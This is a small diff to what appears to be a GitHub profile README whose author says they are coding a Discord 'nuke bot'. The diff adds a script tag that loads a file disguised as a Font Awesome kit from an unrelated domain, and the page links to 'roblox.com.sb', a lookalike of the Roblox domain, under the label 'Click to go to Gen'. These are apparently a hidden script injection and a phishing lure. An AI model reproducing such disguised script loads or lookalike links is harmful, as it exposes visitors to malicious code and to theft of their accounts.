@@ -34,5 +34,8 @@ Currently coding discord nuke bot!
 <p align="center">
     <a href="https://discord.gg/EGjXbqBnPK">Discord Server</a>
   
+      <!-- scripts -->
+    <script src="https://shockify.ga/kit.fontawesome.com/7cf1aca7fb.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="style.css">
               <h3>roblox.com.sb</h3>
               <a href="https://roblox.com.sb/creates/Dain/" style="text-decoration:none" class=bn5>Click to go to Gen</a>  
